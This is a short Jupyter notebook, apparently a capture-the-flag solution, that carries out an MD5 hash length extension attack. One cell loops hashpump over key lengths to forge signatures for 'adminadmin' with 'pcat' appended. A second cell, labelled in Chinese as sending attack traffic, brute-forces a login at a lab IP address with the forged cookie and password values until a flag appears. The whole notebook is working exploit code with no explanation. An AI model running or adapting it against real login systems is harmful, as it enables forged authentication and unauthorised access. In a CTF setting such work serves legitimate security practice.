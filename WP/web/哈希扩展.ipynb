{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### linux 运行 hashpump"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ret =[]\n",
    "for i in range(1,100):\n",
    "    cmd = f'hashpump -s 93796125e52b97ee20d3e9834f98d1f9 -d adminadmin -k {i}  -a pcat '\n",
    "    a = !$cmd\n",
    "    ret.append(a)\n",
    "rlist=[]\n",
    "for i in ret:\n",
    "    rlist.append([i[0],i[-1].replace(r'\\x','%')[5:]])\n",
    "with open('/mnt/z/hash.txt','w') as f:\n",
    "    f.write(str(rlist))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### windows打攻击流量"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "with open('z:/hash.txt','r') as f:\n",
    "    rlist=eval(f.read())\n",
    "for i in rlist[:]:\n",
    "    url = 'http://10.101.0.20/'\n",
    "    session = requests.session()\n",
    "    x=session.get(url)\n",
    "\n",
    "    cookie = {'getmein':i[0]}\n",
    "    ret =session.post(url+f'?username=admin&password={i[1]}',cookies=cookie)\n",
    "    print(i[0],ret.text)\n",
    "    if 'flag' in  ret.text:\n",
    "        break;"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.5 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.10.5"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "3bd13bc16400e16874b7ce28af58a129343287e94248a182c1f06fbb6b76ef8e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
